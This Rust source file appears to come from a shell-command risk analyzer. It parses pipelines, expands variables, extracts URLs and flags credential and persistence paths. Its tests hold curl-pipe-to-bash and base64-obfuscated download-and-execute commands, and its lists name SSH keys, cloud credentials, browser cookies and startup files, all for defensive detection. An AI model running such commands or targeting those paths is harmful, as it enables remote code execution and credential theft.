fn split_pipelines(tokens: &[ShellToken]) -> Vec<Vec<Vec<ShellToken>>> {
    let mut pipelines = Vec::new();
    let mut pipeline: Vec<Vec<ShellToken>> = Vec::new();
    let mut command: Vec<ShellToken> = Vec::new();

    for token in tokens {
        match token {
            ShellToken::Op(op) if op == "|" => {
                if !command.is_empty() {
                    pipeline.push(std::mem::take(&mut command));
                }
            }
            ShellToken::Op(op) if matches!(op.as_str(), ";" | "&&" | "||") => {
                if !command.is_empty() {
                    pipeline.push(std::mem::take(&mut command));
                }
                if !pipeline.is_empty() {
                    pipelines.push(std::mem::take(&mut pipeline));
                }
            }
            _ => command.push(token.clone()),
        }
    }

    if !command.is_empty() {
        pipeline.push(command);
    }
    if !pipeline.is_empty() {
        pipelines.push(pipeline);
    }
    pipelines
}

fn normalize_command(
    tokens: &[ShellToken],
    vars: &mut HashMap<String, String>,
) -> Option<SimpleCommand> {
    let mut words = Vec::new();
    let mut raw_words = Vec::new();
    let mut redirects = Vec::new();
    let mut i = 0;

    while i < tokens.len() {
        match &tokens[i] {
            ShellToken::Op(op) if is_redirect_op(op) => {
                if let Some(ShellToken::Word(target)) = tokens.get(i + 1) {
                    redirects.push(Redirect {
                        op: op.clone(),
                        target: expand_word(target, vars),
                    });
                    i += 2;
                } else {
                    i += 1;
                }
            }
            ShellToken::Word(word) => {
                words.push(expand_word(word, vars));
                raw_words.push(word.raw.clone());
                i += 1;
            }
            ShellToken::Op(_) => i += 1,
        }
    }

    while let Some(first) = words.first().cloned() {
        let Some((key, value)) = split_assignment(&first) else {
            break;
        };
        vars.insert(key.to_string(), value.to_string());
        words.remove(0);
        raw_words.remove(0);
    }

    if words.is_empty() {
        return None;
    }

    Some(SimpleCommand {
        name: words[0].clone(),
        args: words[1..].to_vec(),
        raw_words,
        redirects,
    })
}

fn is_redirect_op(op: &str) -> bool {
    matches!(op, ">" | ">>" | "<" | "<<" | "2>" | "2>>" | "1>" | "1>>")
}

fn expand_word(word: &WordToken, vars: &HashMap<String, String>) -> String {
    if !word.expandable {
        return word.text.clone();
    }
    expand_vars(&word.text, vars)
}

fn expand_vars(input: &str, vars: &HashMap<String, String>) -> String {
    let chars: Vec<char> = input.chars().collect();
    let mut out = String::new();
    let mut i = 0;
    while i < chars.len() {
        if chars[i] != '$' {
            out.push(chars[i]);
            i += 1;
            continue;
        }

        if i + 1 < chars.len() && chars[i + 1] == '{' {
            let mut j = i + 2;
            while j < chars.len() && chars[j] != '}' {
                j += 1;
            }
            if j < chars.len() {
                let key: String = chars[i + 2..j].iter().collect();
                if let Some(value) = vars.get(&key) {
                    out.push_str(value);
                } else {
                    out.push_str("${");
                    out.push_str(&key);
                    out.push('}');
                }
                i = j + 1;
                continue;
            }
        }

        let mut j = i + 1;
        while j < chars.len() && (chars[j].is_ascii_alphanumeric() || chars[j] == '_') {
            j += 1;
        }
        if j == i + 1 {
            out.push('$');
            i += 1;
            continue;
        }
        let key: String = chars[i + 1..j].iter().collect();
        if let Some(value) = vars.get(&key) {
            out.push_str(value);
        } else {
            out.push('$');
            out.push_str(&key);
        }
        i = j;
    }
    out
}

fn split_assignment(input: &str) -> Option<(&str, &str)> {
    let (key, value) = input.split_once('=')?;
    if key.is_empty() {
        return None;
    }
    let mut chars = key.chars();
    let first = chars.next()?;
    if !(first.is_ascii_alphabetic() || first == '_') {
        return None;
    }
    if chars.all(|c| c.is_ascii_alphanumeric() || c == '_') {
        Some((key, value))
    } else {
        None
    }
}

fn command_name(input: &str) -> String {
    input
        .rsplit('/')
        .next()
        .unwrap_or(input)
        .to_ascii_lowercase()
}

fn find_urls(args: &[String]) -> Vec<String> {
    args.iter()
        .filter(|arg| contains_url(arg))
        .flat_map(|arg| extract_urls(arg))
        .collect()
}

fn contains_url(input: &str) -> bool {
    input.contains("http://") || input.contains("https://")
}

fn extract_urls(input: &str) -> Vec<String> {
    input
        .split(|c: char| c.is_whitespace() || matches!(c, '"' | '\'' | ')' | '(' | ';' | ','))
        .filter(|part| part.starts_with("http://") || part.starts_with("https://"))
        .map(|part| {
            part.trim_end_matches(|c: char| matches!(c, '.' | ',' | ';'))
                .to_string()
        })
        .collect()
}

fn curl_output_paths(args: &[String]) -> Vec<String> {
    let mut paths = Vec::new();
    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "-o" | "--output" => {
                if let Some(path) = args.get(i + 1) {
                    paths.push(path.clone());
                }
                i += 2;
            }
            arg if arg.starts_with("--output=") => {
                paths.push(arg.trim_start_matches("--output=").to_string());
                i += 1;
            }
            _ => i += 1,
        }
    }
    paths
}

fn wget_output_paths(args: &[String]) -> Vec<String> {
    let mut paths = Vec::new();
    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "-O" | "--output-document" => {
                if let Some(path) = args.get(i + 1) {
                    paths.push(path.clone());
                }
                i += 2;
            }
            arg if arg.starts_with("--output-document=") => {
                paths.push(arg.trim_start_matches("--output-document=").to_string());
                i += 1;
            }
            _ => i += 1,
        }
    }
    paths
}

fn curl_uploads(args: &[String]) -> bool {
    args.iter().any(|arg| {
        matches!(
            arg.as_str(),
            "-d" | "--data"
                | "--data-binary"
                | "--data-raw"
                | "-F"
                | "--form"
                | "-T"
                | "--upload-file"
        ) || arg.starts_with("--data=")
            || arg.starts_with("--data-binary=")
            || arg.starts_with("--upload-file=")
    })
}

fn printf_literal(args: &[String]) -> String {
    if args.is_empty() {
        return String::new();
    }
    if args[0].contains("%s") && args.len() > 1 {
        return args[1..].join(" ");
    }
    args[0].replace("\\n", "\n")
}

fn script_after_flag<'a>(args: &'a [String], flag: &str) -> Option<&'a str> {
    args.windows(2)
        .find(|pair| pair[0] == flag)
        .map(|pair| pair[1].as_str())
}

fn script_after_any_flag<'a>(args: &'a [String], flags: &[&str]) -> Option<&'a str> {
    args.windows(2)
        .find(|pair| flags.contains(&pair[0].as_str()))
        .map(|pair| pair[1].as_str())
}

fn strip_privilege_wrapper(name: &str, command: &SimpleCommand) -> Option<SimpleCommand> {
    if name == "su" {
        return script_after_flag(&command.args, "-c").map(|script| SimpleCommand {
            name: "sh".to_string(),
            args: vec!["-c".to_string(), script.to_string()],
            raw_words: vec!["sh".to_string(), "-c".to_string(), script.to_string()],
            redirects: Vec::new(),
        });
    }

    let mut args = command.args.iter().peekable();
    while let Some(arg) = args.peek() {
        if *arg == "--" {
            args.next();
            break;
        }
        if arg.starts_with('-') {
            args.next();
            continue;
        }
        break;
    }
    let rest: Vec<String> = args.cloned().collect();
    if rest.is_empty() {
        return None;
    }
    Some(SimpleCommand {
        name: rest[0].clone(),
        args: rest[1..].to_vec(),
        raw_words: rest,
        redirects: command.redirects.clone(),
    })
}

fn clean_path(path: &str) -> String {
    path.trim_matches('"').trim_matches('\'').to_string()
}

fn is_credential_path(path: &str) -> bool {
    let lower = path.to_ascii_lowercase();
    [
        ".ssh",
        "id_rsa",
        "id_ed25519",
        ".gnupg",
        ".aws/credentials",
        ".config/gcloud",
        ".docker/config.json",
        ".mozilla/firefox",
        ".config/google-chrome",
        ".config/chromium",
        "login data",
        "cookies",
    ]
    .iter()
    .any(|needle| lower.contains(needle))
}

fn is_persistence_path(path: &str) -> bool {
    let lower = path.to_ascii_lowercase();
    [
        ".bashrc",
        ".bash_profile",
        ".profile",
        ".zshrc",
        ".config/autostart",
        ".config/systemd/user",
        ".config/fish/conf.d",
        "/etc/profile",
        "/etc/cron",
        "crontab",
    ]
    .iter()
    .any(|needle| lower.contains(needle))
}

fn extract_command_substitutions(input: &str) -> Vec<String> {
    let chars: Vec<char> = input.chars().collect();
    let mut out = Vec::new();
    let mut i = 0;
    while i + 1 < chars.len() {
        if chars[i] == '$' && chars[i + 1] == '(' {
            let (sub, next) = read_command_substitution(&chars, i);
            if sub.len() >= 3 && sub.ends_with(')') {
                out.push(sub[2..sub.len() - 1].to_string());
            }
            i = next;
        } else {
            i += 1;
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use pretty_assertions::assert_eq;

    fn analyze(input: &str) -> Analysis {
        Analyzer::default().analyze(input)
    }

    #[test]
    fn detects_remote_execute_pipeline() {
        let analysis = analyze("curl -fsSL https://example.test/x.sh | bash");

        assert_eq!(analysis.severity, Severity::High);
        assert!(analysis.effects.contains(&EffectKind::RemoteDownload));
        assert!(analysis.effects.contains(&EffectKind::DynamicExecution));
    }

    #[test]
    fn detects_base64_decode_to_bash() {
        let analysis = analyze(
            "echo Y3VybCAtZnNTTCBodHRwczovL2V4YW1wbGUudGVzdC94LnNoIHwgYmFzaAo= | base64 -d | bash",
        );

        assert_eq!(analysis.severity, Severity::High);
        assert!(analysis.effects.contains(&EffectKind::ConcealedPayload));
        assert!(analysis.effects.contains(&EffectKind::DynamicExecution));
        assert!(!analysis.decoded_variants.is_empty());
    }

    #[test]
    fn follows_literal_variables_to_downloaded_file() {
        let analysis = analyze(
            "a=curl; b=https://example.test/x.sh; \"$a\" -fsSL \"$b\" -o /tmp/z; sh /tmp/z",
        );

        assert_eq!(analysis.severity, Severity::High);
        assert!(analysis.effects.contains(&EffectKind::RemoteDownload));
        assert!(analysis.effects.contains(&EffectKind::DynamicExecution));
    }

    #[test]
    fn ordinary_package_command_is_safe() {
        let analysis = analyze("sudo apt update && sudo apt install ripgrep");

        assert_eq!(analysis.severity, Severity::Low);
        assert!(analysis.effects.contains(&EffectKind::PrivilegeEscalation));
        assert!(!analysis.effects.contains(&EffectKind::RemoteDownload));
    }

    #[test]
    fn tokenizes_bracketed_assignment() {
        let tokens = tokenize("a=curl; \"$a\" https://example.test");
        let pipelines = split_pipelines(&tokens);
        assert_eq!(pipelines.len(), 2);
    }
}
